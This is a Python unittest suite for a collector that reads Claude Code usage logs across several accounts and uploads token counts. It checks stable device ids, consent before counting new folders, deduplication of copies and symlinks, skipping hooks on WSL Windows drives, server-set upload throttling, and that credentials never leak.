"""Several Claude accounts on one machine (collector v7). Each test exists because of a finding
in the 2026-10-15 pre-deploy review:

- existing machines keep their v6 id, or their history counts twice;
- a self-updated collector never starts uploading a folder nobody chose;
- one folder is one machine however it is named;
- a copy, or a symlinked ~/.claude, never puts the same usage on two machines;
- across many runs, every message is counted exactly once on the server."""
import builtins
import contextlib
import hashlib
import importlib.util
import io
import json
import os
import platform
import shutil
import sys
import tempfile
import time
import unittest
from datetime import date, timedelta
from unittest import mock

_spec = importlib.util.spec_from_file_location(
    "tt_dirs", os.path.join(os.path.dirname(__file__), "..", "collector", "tally_tokens.py"))
tt = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(tt)

# collector v6's device(), verbatim (git show 6190f4a:collector/tally_tokens.py). Every existing
# player's ~/.claude row was made by this; v7 must give the same id.
V6_DEVICE = '''
def device():
    base = os.environ.get("CLAUDE_CONFIG_DIR") or os.path.expanduser("~/.claude")
    key = _machine_key()
    if key:
        dev_id = hashlib.sha256(f"tokenrpg:{key}:{os.path.expanduser('~')}:{base}".encode()).hexdigest()[:32]
    else:
        path = os.path.join(os.path.dirname(CONFIG), "device-id")
        try:
            with open(path) as fh:
                dev_id = fh.read().strip()
        except OSError:
            dev_id = ""
        if len(dev_id) < 8:
            dev_id = hashlib.sha256(os.urandom(32)).hexdigest()[:32]
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w") as fh:
                fh.write(dev_id)
    label = (platform.node() or "this computer").split(".")[0][:40]
    return {"id": dev_id, "label": label}
'''


def v6_device():
    ns = {"os": os, "hashlib": hashlib, "platform": platform,
          "_machine_key": tt._machine_key, "CONFIG": tt.CONFIG}
    exec(V6_DEVICE, ns)
    return ns["device"]()


def record(mid, ts="2026-10-01T12:00:00Z", cache_read=1000):
    return json.dumps({"timestamp": ts, "cwd": "/x/proj", "message": {
        "id": mid, "model": "claude-test", "usage": {"input_tokens": 0, "output_tokens": 0,
                                                     "cache_creation_input_tokens": 0,
                                                     "cache_read_input_tokens": cache_read}}})


MAX5 = {"organizationType": "claude_max", "organizationRateLimitTier": "default_claude_max_5x"}
MAX20 = {"organizationType": "claude_max", "organizationRateLimitTier": "default_claude_max_20x"}


class Home(unittest.TestCase):
    """A throwaway $HOME, so nothing here can touch the real ~/.claude."""
    prefix = "home"

    def setUp(self):
        self.home = os.path.realpath(tempfile.mkdtemp(prefix=self.prefix))
        self.env = mock.patch.dict(os.environ, {"HOME": self.home})
        self.env.start()
        os.environ.pop("CLAUDE_CONFIG_DIR", None)
        cfg = os.path.join(self.home, ".config", "tokenrpg")
        os.makedirs(cfg)
        with open(os.path.join(cfg, "config.json"), "w") as fh:
            json.dump({"url": "https://example.invalid", "token": "t"}, fh)
        self.server = {}                 # (device id, day) -> total, replaced per upload like /api/ingest
        self.uploads = []
        self.every = None                # upload_every in the fake server's reply (None: not sent, as before v11)
        # Every file the collector keeps beside its config, or a test would write the real one
        # (until v11 the suite reset the player's own last-upload stamp; see test_harness_*).
        self.patches = [mock.patch.object(tt, "CONFIG", os.path.join(cfg, "config.json")),
                        mock.patch.object(tt, "DIRS_FILE", os.path.join(cfg, "claude-dirs.txt")),
                        mock.patch.object(tt, "LAST_UPLOAD", os.path.join(cfg, "last-upload")),
                        mock.patch.object(tt, "UPLOAD_EVERY", os.path.join(cfg, "upload-every")),
                        mock.patch.object(tt, "CACHE", os.path.join(cfg, "log-cache.json")),
                        mock.patch.object(tt, "UPLOAD_LOCK", os.path.join(cfg, "upload.lock")),
                        mock.patch.object(tt, "UPDATE_SKIPPED", os.path.join(cfg, "update-skipped")),
                        mock.patch.object(tt, "_machine_key", return_value="machine-k"),
                        mock.patch.object(tt, "http", side_effect=self.fake_http),
                        mock.patch.object(tt, "QUIET", False),
                        # own_sha256() reads HERE once per process: a test that points HERE at another script
                        # (test_move.OldCollector) must not leave that script's hash for the next test.
                        mock.patch.object(tt, "_OWN_SHA", []),
                        mock.patch.object(tt, "LOG", os.path.join(cfg, "runs.log"))]   # never the repo's
        for p in self.patches:
            p.start()

    def tearDown(self):
        for p in self.patches:
            p.stop()
        self.env.stop()

    def fake_http(self, url, data=None, headers=None):
        body = json.loads(data)
        self.uploads.append(body)
        for day, rec in body["days"].items():
            self.server[(body["device"]["id"], day)] = sum(rec[f] for f in ("input", "output", "cache_write", "cache_read"))
        reply = {"accepted": len(body["days"]), "handle": "h", "device": body["device"]["label"]}
        if self.every is not None:
            reply["upload_every"] = self.every
        return 200, json.dumps(reply).encode()

    def folder(self, name, account=None, records=(), session="s"):
        """A Claude Code folder. account: plan fields for its .claude.json (a CLAUDE_CONFIG_DIR
        folder keeps one inside; ~/.claude's lives at ~/.claude.json)."""
        path = os.path.join(self.home, name)
        os.makedirs(os.path.join(path, "projects", "proj"), exist_ok=True)
        if account is not None:
            target = os.path.join(self.home, ".claude.json") if name == ".claude" else os.path.join(path, ".claude.json")
            with open(target, "w") as fh:
                json.dump({"oauthAccount": account}, fh)
        with open(os.path.join(path, "projects", "proj", f"{session}.jsonl"), "a") as fh:
            fh.write("".join(r + "\n" for r in records))
        return path

    def run_cli(self, *argv, config_dir=None, tty=False, answers=None):
        env = {"CLAUDE_CONFIG_DIR": config_dir} if config_dir else {}
        replies = iter(answers or [])

        def ask(prompt=""):
            try:
                return next(replies)
            except StopIteration:
                raise AssertionError(f"asked unexpectedly: {prompt}")

        before = len(self.uploads)
        with mock.patch.dict(os.environ, env), mock.patch.object(sys, "argv", ["tally_tokens.py", *argv]), \
                mock.patch.object(sys.stdin, "isatty", return_value=tty), \
                mock.patch.object(builtins, "input", side_effect=ask), \
                contextlib.redirect_stdout(io.StringIO()) as out:
            try:
                tt.main()
            except SystemExit:
                pass
        self.out = out.getvalue()
        return self.uploads[before:]

    def server_total(self):
        return sum(self.server.values())


# Where the collector keeps its files when nothing is patched: the player's own folder.
REAL_CONFIG_DIR = os.path.dirname(tt.CONFIG)


class Harness(Home):
    def test_harness_keeps_every_collector_file_in_the_throwaway_home(self):
        for name in dir(tt):
            value = getattr(tt, name)
            if isinstance(value, str) and os.path.isabs(value):
                self.assertFalse(value.startswith(REAL_CONFIG_DIR + os.sep), f"tt.{name} = {value}")
        self.folder(".claude", {}, [record("a1")])
        self.run_cli("--push", "--quiet")
        cfg = os.path.dirname(tt.CONFIG)
        self.assertTrue(cfg.startswith(self.home))
        for f in ("last-upload", "log-cache.json"):
            self.assertTrue(os.path.exists(os.path.join(cfg, f)), f)


class KeepsV6Ids(Home):
    def assert_default_matches_v6(self):
        self.assertEqual(tt.device(tt.claude_dirs()[0])["id"], v6_device()["id"])

    def test_plain_home(self):
        self.folder(".claude")
        self.assert_default_matches_v6()

    def test_home_with_trailing_slash(self):
        self.folder(".claude")
        with mock.patch.dict(os.environ, {"HOME": self.home + "/"}):
            self.assert_default_matches_v6()

    def test_claude_folder_symlinked_from_dotfiles(self):
        real = os.path.join(self.home, "dotfiles", "claude")
        os.makedirs(os.path.join(real, "projects"))
        os.symlink(real, os.path.join(self.home, ".claude"))
        self.assert_default_matches_v6()

    def test_symlinked_home(self):
        self.folder(".claude")
        link = self.home + "-link"
        os.symlink(self.home, link)
        with mock.patch.dict(os.environ, {"HOME": link}):
            self.assert_default_matches_v6()

    def test_no_machine_id(self):
        self.folder(".claude")
        with mock.patch.object(tt, "_machine_key", return_value=None):
            self.assert_default_matches_v6()

    def test_v6_config_dir_player_with_plain_path(self):
        work = self.folder(".claude-work", MAX5)
        with mock.patch.dict(os.environ, {"CLAUDE_CONFIG_DIR": work}):
            self.assertEqual(tt.claude_dirs(), [work])
            self.assertEqual(tt.device(work)["id"], v6_device()["id"])


class OnlyFoldersThePlayerChose(Home):
    def setUp(self):
        super().setUp()
        self.folder(".claude", MAX20, [record("a1")])
        self.work = self.folder(".claude-work", MAX5, [record("b1")], session="w")

    def test_hook_run_never_adds_a_folder(self):
        # An existing player gets v7 by self-update; their next hook run is quiet.
        sent = self.run_cli("--push", "--quiet")
        self.assertEqual(len(sent), 1)
        self.assertFalse(os.path.exists(tt.DIRS_FILE))

    def test_hand_run_without_a_terminal_only_says_how(self):
        sent = self.run_cli("--push")
        self.assertEqual(len(sent), 1)
        self.assertIn("--add-dir", self.out)

    def test_yes_counts_it_from_then_on(self):
        sent = self.run_cli("--push", "--days", "0", tty=True, answers=[""])
        self.assertEqual([b["plan"]["organizationRateLimitTier"] for b in sent],
                         ["default_claude_max_20x", "default_claude_max_5x"])
        self.assertTrue(sent[1]["device"]["label"].endswith(" · claude-work"))
        self.assertEqual(len(self.run_cli("--push", "--quiet")), 2)       # the hook now sends both

    def test_no_is_remembered(self):
        self.assertEqual(len(self.run_cli("--push", tty=True, answers=["n"])), 1)
        self.assertEqual(len(self.run_cli("--push", tty=True, answers=[])), 1)    # not asked again

    def test_a_pasted_command_is_not_a_yes(self):
        self.run_cli("--push", tty=True, answers=["python3 x.py --install-hook", "zzz", "q"])
        self.assertEqual(len(self.run_cli("--push", "--quiet")), 1)

    def test_install_hook_offers_then_hooks_every_counted_folder(self):
        self.run_cli("--install-hook", tty=True, answers=["y"])
        self.run_cli("--install-hook", tty=True, answers=[])              # idempotent, no second ask
        for d in (os.path.join(self.home, ".claude"), self.work):
            with open(os.path.join(d, "settings.json")) as fh:
                self.assertEqual(len(json.load(fh)["hooks"]["SessionStart"]), 1, d)

    def test_backup_copy_of_default_is_never_offered(self):
        self.folder(".claude-backup", None, [record("a1")])       # no .claude.json of its own
        self.assertEqual(tt.discover(), [self.work])


class OneFolderOneMachine(Home):
    def setUp(self):
        super().setUp()
        self.folder(".claude", MAX20, [record("a1")])
        self.work = self.folder(".claude-work", MAX5, [record("b1")], session="w")
        tt._remember(self.work, True)

    def ids(self):
        return sorted(tt.device(d)["id"] for d in tt.claude_dirs())

    def test_any_spelling_of_a_folder_is_one_machine(self):
        plain = self.ids()
        self.assertEqual(len(plain), 2)
        os.symlink(self.work, os.path.join(self.home, ".claude-alias"))
        for env in (self.work + "/", os.path.join(self.home, ".claude-alias"), "~/.claude-work",
                    self.work.replace("/.claude-work", "//.claude-work")):
            with mock.patch.dict(os.environ, {"CLAUDE_CONFIG_DIR": env}):
                self.assertEqual(self.ids(), plain, env)

    def test_config_dir_set_to_default_is_the_default(self):
        with mock.patch.dict(os.environ, {"CLAUDE_CONFIG_DIR": os.path.join(self.home, ".claude") + "/"}):
            self.assertEqual(self.ids(), sorted(tt.device(d)["id"] for d in tt.claude_dirs()))
            self.assertEqual(tt.claude_dirs()[0], tt.default_dir())

    def test_copy_of_a_counted_folder_is_refused(self):
        self.folder(".claude-copy", MAX5, [record("b1")], session="w")    # same session file as work
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(tt.discover(), [])
        with self.assertRaises(SystemExit), contextlib.redirect_stdout(io.StringIO()):
            tt.add_dir(os.path.join(self.home, ".claude-copy"))
        self.assertEqual(len(tt.claude_dirs()), 2)

    def test_two_new_copies_of_each_other_offer_only_one(self):
        self.folder(".claude-x", MAX5, [record("x1")], session="x")
        self.folder(".claude-y", MAX5, [record("x1")], session="x")
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(tt.discover(), [os.path.join(self.home, ".claude-x")])

    def test_add_dir_refuses_a_folder_that_is_not_claude(self):
        os.makedirs(os.path.join(self.home, "Documents"))
        with self.assertRaises(SystemExit), contextlib.redirect_stdout(io.StringIO()):
            tt.add_dir(os.path.join(self.home, "Documents"))


class SymlinkedDefault(Home):
    """Switching accounts by repointing ~/.claude: its folder changes under the same name, so
    only ~/.claude is ever counted (v6 behaviour)."""

    def test_only_default_whatever_else_is_named(self):
        a = self.folder(".claude-a", MAX5, [record("a1")], session="a")
        b = self.folder(".claude-b", MAX20, [record("b1")], session="b")
        os.symlink(a, os.path.join(self.home, ".claude"))
        tt._remember(b, True)
        with mock.patch.dict(os.environ, {"CLAUDE_CONFIG_DIR": b}):
            self.assertEqual(tt.claude_dirs(), [tt.default_dir()])
        self.assertEqual(tt.discover(), [])
        with self.assertRaises(SystemExit), contextlib.redirect_stdout(io.StringIO()):
            tt.add_dir(b)

    def test_repointing_never_double_counts(self):
        a = self.folder(".claude-a", MAX5, [record("a1"), record("a2")], session="a")
        b = self.folder(".claude-b", MAX20, [record("b1")], session="b")
        link = os.path.join(self.home, ".claude")
        os.symlink(a, link)
        self.run_cli("--push", "--quiet")
        os.remove(link)
        os.symlink(b, link)
        self.run_cli("--push", "--quiet", config_dir=b)
        self.assertLessEqual(self.server_total(), 3000)       # v6 under-counted here too; never over


class EveryMessageOnce(Home):
    def test_many_runs_in_any_order(self):
        self.folder(".claude", MAX20, [record("a1"), record("a2", "2026-10-02T09:00:00Z")])
        work = self.folder(".claude-work", MAX5, [record("b1"), record("b2")], session="w")
        self.run_cli("--push", "--days", "0", tty=True, answers=["y"])
        self.run_cli("--push", "--quiet", "--days", "0", config_dir=work + "/")   # hook from the work account
        self.run_cli("--push", "--quiet", "--days", "0")
        # A third account added later, at a path that sorts before both: order must not change.
        early = os.path.realpath(tempfile.mkdtemp(prefix="0early"))
        os.makedirs(os.path.join(early, "projects", "p"))
        with open(os.path.join(early, "projects", "p", "e.jsonl"), "w") as fh:
            fh.write(record("c1") + "\n")
        with contextlib.redirect_stdout(io.StringIO()):
            tt.add_dir(early)
        self.assertEqual(tt.claude_dirs(), [tt.default_dir(), work, early])
        self.run_cli("--push", "--quiet", "--days", "0", config_dir=early)
        self.run_cli("--push", "--days", "0", tty=True)
        self.assertEqual(self.server_total(), 5000)
        self.assertEqual(len({dev for dev, _ in self.server}), 3)

    def test_message_in_two_folders_stays_with_the_earlier(self):
        self.folder(".claude", {}, [record("m1"), record("shared")])
        work = self.folder(".claude-work", {}, [record("m2"), record("shared")], session="w")
        tt._remember(work, True)
        seen = set()
        per = [tt.collect(0, base=d, seen=seen) for d in tt.claude_dirs()]
        self.assertEqual(per[0]["2026-10-01"]["cache_read"], 2000)
        self.assertEqual(per[1]["2026-10-01"]["cache_read"], 1000)


class Hooks(Home):
    def test_named_folder_without_projects_still_gets_hooks(self):
        # The v6 recipe for a fresh account: CLAUDE_CONFIG_DIR=~/.claude-new ... --install-hook
        self.folder(".claude", {})
        new = os.path.join(self.home, ".claude-new")
        self.run_cli("--install-hook", config_dir=new)
        self.assertTrue(os.path.isfile(os.path.join(new, "settings.json")))

    def test_only_config_dir_named_hooks_it_alone(self):
        new = os.path.join(self.home, ".claude-new")
        self.run_cli("--install-hook", config_dir=new)
        self.assertTrue(os.path.isfile(os.path.join(new, "settings.json")))
        self.assertFalse(os.path.exists(tt.default_dir()))      # v6 never created ~/.claude here

    def test_symlinked_settings_stay_symlinked(self):
        d = self.folder(".claude", {})
        real = os.path.join(self.home, "dotfiles-settings.json")
        with open(real, "w") as fh:
            json.dump({"theme": "dark"}, fh)
        os.symlink(real, os.path.join(d, "settings.json"))
        self.run_cli("--install-hook")
        self.assertTrue(os.path.islink(os.path.join(d, "settings.json")))
        with open(real) as fh:
            self.assertIn("SessionStart", json.load(fh)["hooks"])


class WindowsDrive(Home):
    """WSL: --add-dir /mnt/c/Users/<name>/.claude reads Windows's Claude Code history, but our hook
    is a Linux command, so it must never be written into that folder's settings.json. A fixture
    folder stands in for /mnt, so the test needs no real Windows drive."""

    SETTINGS = b'{"theme": "light",\r\n "hooks": {"PreToolUse": []}}\r\n'      # Windows line endings

    def setUp(self):
        super().setUp()
        self.mnt = os.path.join(self.home, "mnt")
        for p in (mock.patch.object(tt, "WINDOWS_DRIVES", self.mnt), mock.patch.object(tt, "is_wsl", return_value=True)):
            p.start()
            self.patches.append(p)
        self.folder(".claude", {}, [record("a1")])
        self.win = os.path.join(self.mnt, "c", "Users", "Pat", ".claude")
        os.makedirs(os.path.join(self.win, "projects", "proj"))
        with open(os.path.join(self.win, "projects", "proj", "w.jsonl"), "w") as fh:
            fh.write(record("w1") + "\n" + record("w2", "2026-10-02T09:00:00Z") + "\n")
        with open(os.path.join(self.win, "settings.json"), "wb") as fh:
            fh.write(self.SETTINGS)

    def assert_untouched(self):
        with open(os.path.join(self.win, "settings.json"), "rb") as fh:
            self.assertEqual(fh.read(), self.SETTINGS)
        self.assertEqual(sorted(os.listdir(self.win)), ["projects", "settings.json"])   # no backup, no temp file

    def test_add_dir_reads_history_but_installs_no_hook(self):
        sent = self.run_cli("--add-dir", self.win)
        self.assertEqual(len(sent), 1)
        self.assertEqual(sorted(sent[0]["days"]), ["2026-10-01", "2026-10-02"])
        self.assertEqual(sent[0]["hooks"], [])
        self.assert_untouched()
        self.assertIn("is on a Windows drive, so no hooks were added", self.out)
        self.assertEqual(self.out.count("Windows drive"), 1)                        # one plain line
        self.assertIn(self.win, tt.claude_dirs())                                   # counted from now on

    def test_rerunning_step_3_still_skips_it(self):
        self.run_cli("--add-dir", self.win)
        self.run_cli("--install-hook")
        self.assert_untouched()
        with open(os.path.join(self.home, ".claude", "settings.json")) as fh:
            self.assertIn("SessionStart", json.load(fh)["hooks"])                   # Linux side hooked as before
        self.assertEqual(len(self.run_cli("--push", "--quiet")), 2)                 # the Linux hook uploads both

    def test_reports_the_hooks_that_upload_it(self):
        # Settings → Your machines must not say "by hand only" for it: ~/.claude's hooks upload it.
        self.run_cli("--install-hook")
        sent = self.run_cli("--add-dir", self.win)
        self.assertEqual(sent[0]["hooks"], sorted(tt.HOOK_EVENTS))
        both = {b["device"]["label"]: b["hooks"] for b in self.run_cli("--push", "--quiet")}
        self.assertEqual(list(both.values()), [sorted(tt.HOOK_EVENTS)] * 2)
        self.assert_untouched()

    def test_reports_none_when_the_linux_side_has_none(self):
        sent = self.run_cli("--add-dir", self.win)
        self.assertEqual(sent[0]["hooks"], [])

    def test_config_dir_is_the_folder_whose_hooks_count(self):
        work = self.folder(".claude-work", {}, [record("b1")], session="b")
        with open(os.path.join(work, "settings.json"), "w") as fh:
            json.dump({"hooks": tt.hook_settings()}, fh)
        tt._remember(self.win, True)
        with mock.patch.dict(os.environ, {"CLAUDE_CONFIG_DIR": work}):
            self.assertEqual(tt.hooks_that_upload(self.win), sorted(tt.HOOK_EVENTS))
        self.assertEqual(tt.hooks_that_upload(self.win), [])                     # ~/.claude has none
        with open(os.path.join(self.win, "settings.json"), "w") as fh:            # say someone hooked Windows's side
            json.dump({"hooks": tt.hook_settings()}, fh)
        with mock.patch.dict(os.environ, {"CLAUDE_CONFIG_DIR": self.win}):
            self.assertEqual(tt.hooks_that_upload(self.win), [])                 # never its own Windows file
        self.run_cli("--install-hook")                                         # now hook the Linux side
        with mock.patch.dict(os.environ, {"CLAUDE_CONFIG_DIR": self.win}):
            self.assertEqual(tt.hooks_that_upload(self.win), sorted(tt.HOOK_EVENTS))   # ~/.claude's, not Windows's
        shutil.rmtree(os.path.join(self.home, ".claude"))
        os.symlink(self.win, os.path.join(self.home, ".claude"))                 # ~/.claude is the Windows folder
        self.assertEqual(tt.hooks_that_upload(self.win), [])

    def test_a_symlink_into_the_drive_counts_as_the_drive(self):
        link = os.path.join(self.home, "win-claude")
        os.symlink(self.win, link)
        self.run_cli("--add-dir", link)
        self.assert_untouched()

    def test_home_claude_linked_to_the_drive_gets_no_hook(self):
        # ~/.claude pointed at Windows's folder: one folder only, named by its link, never hooked.
        shutil.rmtree(os.path.join(self.home, ".claude"))
        os.symlink(self.win, os.path.join(self.home, ".claude"))
        self.run_cli("--install-hook")
        self.assert_untouched()
        self.assertEqual(len(self.run_cli("--push", "--quiet")), 1)

    def test_settings_symlinked_onto_the_drive_are_left_alone(self):
        linux = self.folder(".claude-work", {}, [record("b1")], session="b")
        os.symlink(os.path.join(self.win, "settings.json"), os.path.join(linux, "settings.json"))
        self.run_cli("--add-dir", linux)
        self.assert_untouched()

    def test_a_linux_folder_still_gets_hooks(self):
        work = self.folder(".claude-work", {}, [record("b1")], session="b")
        sent = self.run_cli("--add-dir", work)
        self.assertEqual(len(sent), 1)
        with open(os.path.join(work, "settings.json")) as fh:
            self.assertEqual(sorted(json.load(fh)["hooks"]), sorted(tt.HOOK_EVENTS))
        self.assertNotIn("Windows drive", self.out)

    def test_only_drive_letters_under_the_real_mount_point(self):
        with mock.patch.object(tt, "WINDOWS_DRIVES", "/mnt"):
            self.assertTrue(tt.on_windows_drive("/mnt/c/Users/x/.claude"))
            self.assertTrue(tt.on_windows_drive("/mnt/D"))
            for linux in ("/mnt/data/home/pat/.claude", "/mnt/nvme/claude", "/mnt/c1/.claude", "/mnt/1/.claude",
                          "/mnt/_/.claude", "/mnt", "/mnt-c/Users/x/.claude",
                          "/mntx/c/.claude", "/home/x/mnt/c/.claude", os.path.join(self.home, ".claude")):
                self.assertFalse(tt.on_windows_drive(linux), linux)

    def test_plain_linux_has_no_windows_drives(self):
        with mock.patch.object(tt, "WINDOWS_DRIVES", "/mnt"), mock.patch.object(tt, "is_wsl", return_value=False):
            self.assertFalse(tt.on_windows_drive("/mnt/c/Users/x/.claude"))
        with mock.patch.object(tt, "is_wsl", return_value=False):                # the fixture drive, on plain Linux
            self.assertFalse(tt.on_windows_drive(self.win))
            with open(os.path.join(self.win, "settings.json"), "w") as fh:
                json.dump({"hooks": tt.hook_settings()}, fh)
            self.assertEqual(tt.hooks_that_upload(self.win), sorted(tt.HOOK_EVENTS))   # its own hooks, as any disk
        self.assertEqual(tt.hooks_that_upload(self.win), [])                     # on WSL: ~/.claude's, which has none

    def test_native_linux_disk_under_mnt_gets_hooks_on_wsl(self):
        disk = os.path.join(self.mnt, "data", "home", "pat", ".claude")
        os.makedirs(os.path.join(disk, "projects", "proj"))
        with open(os.path.join(disk, "projects", "proj", "d.jsonl"), "w") as fh:
            fh.write(record("d1") + "\n")
        sent = self.run_cli("--add-dir", disk)
        with open(os.path.join(disk, "settings.json")) as fh:
            self.assertEqual(sorted(json.load(fh)["hooks"]), sorted(tt.HOOK_EVENTS))
        self.assertEqual(sent[0]["hooks"], sorted(tt.HOOK_EVENTS))               # its own hooks
        self.assertNotIn("Windows drive", self.out)


class WslProbe(unittest.TestCase):
    """The real probe (WindowsDrive patches it to say yes)."""

    def test_wsl_is_read_from_the_kernel_version(self):
        d = tempfile.mkdtemp()
        for text, want in (("Linux version 5.15.153.1-microsoft-standard-WSL2 (root@1c602f52c2e4)", True),
                           ("Linux version 4.4.0-19041-Microsoft (Microsoft@Microsoft.com)", True),     # WSL 1
                           ("Linux version 6.9.7-arch1-1 (linux@archlinux)", False)):
            path = os.path.join(d, "version")
            with open(path, "w") as fh:
                fh.write(text)
            self.assertEqual(tt.is_wsl(path), want, text)
        self.assertFalse(tt.is_wsl(os.path.join(d, "missing")))


class Plans(Home):
    SECRET = "sk-ant-oat01-SUPERSECRET"

    def test_default_folder_never_leaks(self):
        d = self.folder(".claude", dict(MAX5, emailAddress="someone@example.com", accountUuid="uuid-123"))
        with open(os.path.join(d, ".credentials.json"), "w") as fh:
            json.dump({"claudeAiOauth": {"accessToken": self.SECRET, "refreshToken": self.SECRET}}, fh)
        sent = json.dumps(tt.plan(d))
        for leak in (self.SECRET, "someone@example.com", "uuid-123"):
            self.assertNotIn(leak, sent)
        self.assertEqual(tt.plan(d)["organizationRateLimitTier"], "default_claude_max_5x")

    def test_default_reads_whichever_account_file_claude_wrote_last(self):
        d = self.folder(".claude", MAX5)
        inside = os.path.join(d, ".claude.json")     # CLAUDE_CONFIG_DIR=~/.claude puts it here
        with open(inside, "w") as fh:
            json.dump({"oauthAccount": MAX20}, fh)
        os.utime(os.path.join(self.home, ".claude.json"), (1, 1))
        self.assertEqual(tt.plan(d)["organizationRateLimitTier"], "default_claude_max_20x")
        os.utime(inside, (0, 0))
        os.utime(os.path.join(self.home, ".claude.json"), None)
        self.assertEqual(tt.plan(d)["organizationRateLimitTier"], "default_claude_max_5x")


class OddPaths(Home):
    prefix = "home[1]*?"

    def test_glob_characters_in_home(self):
        self.folder(".claude", {}, [record("a1")])
        work = self.folder(".claude-work", {}, [record("b1")], session="w")
        self.assertEqual(tt.discover(), [work])
        self.assertEqual(sum(d["cache_read"] for d in tt.collect(0).values()), 1000)


# ---------- collector v11: the server sets the rate, and only changed files are read ----------

def usage_line(mid, ts="2026-10-01T12:00:00Z", model="claude-test", cwd="/x/proj", **counts):
    u = {"input_tokens": 0, "output_tokens": 0, "cache_creation_input_tokens": 0, "cache_read_input_tokens": 1000}
    u.update(counts)
    return json.dumps({"timestamp": ts, "cwd": cwd, "message": {"id": mid, "model": model, "usage": u}})


class ServerRate(Home):
    """The hooks carry no number: throttled events upload at most every upload_every seconds,
    the figure the last ingest reply carried (clamped 60..3600, 120 before the first)."""

    def setUp(self):
        super().setUp()
        self.folder(".claude", {}, [record("a1")])

    def stamp(self, age):
        with open(tt.LAST_UPLOAD, "w") as fh:
            fh.write(f"{time.time() - age:.3f}\n")

    def ups(self, *argv):
        return len(self.run_cli(*argv))

    def test_default_until_the_server_says(self):
        self.assertEqual(tt.upload_every(), 120)
        self.stamp(100)
        self.assertEqual(self.ups("--hook", "PostToolUse"), 0)
        self.stamp(130)
        self.assertEqual(self.ups("--hook", "PostToolUse"), 1)

    def test_the_reply_sets_the_rate_and_it_is_kept(self):
        self.every = 300
        self.assertEqual(self.ups("--hook", "SessionStart"), 1)
        self.assertEqual(tt.upload_every(), 300)
        self.every = None                                   # a reply without it keeps the last one
        self.stamp(200)
        self.assertEqual(self.ups("--hook", "PostToolUse"), 0)
        self.assertEqual(self.ups("--hook", "Stop"), 0)
        self.stamp(301)
        self.assertEqual(self.ups("--hook", "Stop"), 1)
        self.assertEqual(tt.upload_every(), 300)

    def test_clamped_and_only_whole_seconds(self):
        for sent, kept in ((5, 60), (99999, 3600), (90, 90), ("600", 90), (True, 90), (12.5, 90), (None, 90)):
            self.every = sent
            self.run_cli("--push", "--quiet")
            self.assertEqual(tt.upload_every(), kept, sent)
        with open(tt.UPLOAD_EVERY, "w") as fh:
            fh.write("garbage")
        self.assertEqual(tt.upload_every(), 120)

    def test_v9_reply_hook_follows_the_server_not_its_own_number(self):
        # Lead decision 2026-10-19: --at-most-every N means "throttled", at the server's rate.
        v9 = ("--push", "--quiet", "--at-most-every", "600")
        self.stamp(130)
        self.assertEqual(self.ups(*v9), 1)                  # 130 s < 600 s, but > 120 s: uploads
        self.assertEqual(self.ups(*v9), 0)                  # seconds later: skipped
        self.every = 3600
        self.stamp(700)
        self.assertEqual(self.ups("--push", "--quiet"), 1)  # a v9 SessionEnd: always, and brings 3600
        self.stamp(700)
        self.assertEqual(self.ups(*v9), 0)                  # 700 s > 600 s, but < 3600 s

    def test_start_and_end_always_upload_and_reset_the_clock(self):
        for event in ("SessionStart", "SessionEnd"):
            self.assertEqual(self.ups("--hook", event), 1)
        self.assertEqual(self.ups("--hook", "PostToolUse"), 0)

    def test_an_event_we_do_not_know_yet_is_throttled(self):
        self.stamp(10)
        self.assertEqual(self.ups("--hook", "SomethingNew"), 0)

    def test_what_the_fast_path_reads_from_the_command_line(self):
        self.assertEqual(tt.hook_call(["--hook", "PostToolUse"]), (True, True))
        self.assertEqual(tt.hook_call(["--hook=SessionEnd"]), (True, False))
        self.assertEqual(tt.hook_call(["--hook", "Nope"]), (True, True))
        self.assertEqual(tt.hook_call(["--push", "--quiet"]), (True, False))
        self.assertEqual(tt.hook_call(["--push", "--quiet", "--at-most-every", "600"]), (True, True))
        self.assertEqual(tt.hook_call(["--push"]), (False, False))              # by hand
        self.assertEqual(tt.hook_call([]), (False, False))
        self.assertEqual(tt.hook_call(["--install-hook", "--push", "--quiet"]), (False, False))

    def test_a_clock_in_the_future_or_garbage_does_not_block(self):
        self.stamp(-3600)
        self.assertEqual(self.ups("--hook", "PostToolUse"), 1)
        with open(tt.LAST_UPLOAD, "w") as fh:
            fh.write("not a time")
        self.assertEqual(self.ups("--hook", "PostToolUse"), 1)


class ReviewFixes(Home):
    """Each from the independent review of collector v11 (2026-10-19)."""

    def setUp(self):
        super().setUp()
        self.folder(".claude", {}, [record("a1")])
        self.cfg = os.path.dirname(tt.CONFIG)

    def test_throttle_fails_closed_when_the_stamp_cannot_be_written(self):
        blocker = os.path.join(self.cfg, "not-a-folder")
        open(blocker, "w").close()
        with mock.patch.object(tt, "LAST_UPLOAD", os.path.join(blocker, "last-upload")):
            for _ in range(3):
                self.assertEqual(len(self.run_cli("--hook", "PostToolUse")), 0)   # would be one per tool call
            self.assertEqual(len(self.run_cli("--hook", "SessionEnd")), 1)        # start/end still upload
            self.assertEqual(len(self.run_cli("--push")), 1)                     # and so does a hand run

    def test_a_folder_named_only_by_claude_config_dir_has_its_own_throttle(self):
        work = self.folder(".claude-work", {}, [record("w1")], session="w")
        # ~/.claude's session uploads (work isn't in claude-dirs.txt, so it isn't in that upload)
        self.assertEqual(len(self.run_cli("--hook", "SessionStart")), 1)          # ~/.claude alone
        self.assertEqual(len(self.run_cli("--hook", "PostToolUse")), 0)          # same account: throttled
        sent = self.run_cli("--hook", "PostToolUse", config_dir=work)           # the work account's session
        self.assertEqual(len(sent), 2)                                          # not starved: it uploads, with work
        self.assertEqual(len(self.run_cli("--hook", "PostToolUse", config_dir=work)), 0)   # then throttled itself
        self.assertEqual(len(self.run_cli("--hook", "PostToolUse", config_dir=work + "/")), 0)   # one folder, one stamp
        self.assertEqual(len(self.run_cli("--hook", "PostToolUse", config_dir=tt.default_dir())), 0)

    def test_runs_log_keeps_start_end_and_problems_not_throttled_successes(self):
        def log():
            try:
                with open(tt.LOG) as fh:
                    return fh.read()
            except OSError:
                return ""
        self.run_cli("--hook", "SessionStart")
        self.assertEqual(log().count("Uploaded"), 1)
        with open(tt.LAST_UPLOAD, "w") as fh:
            fh.write(f"{time.time() - 500:.3f}\n")
        self.assertEqual(len(self.run_cli("--hook", "PostToolUse")), 1)
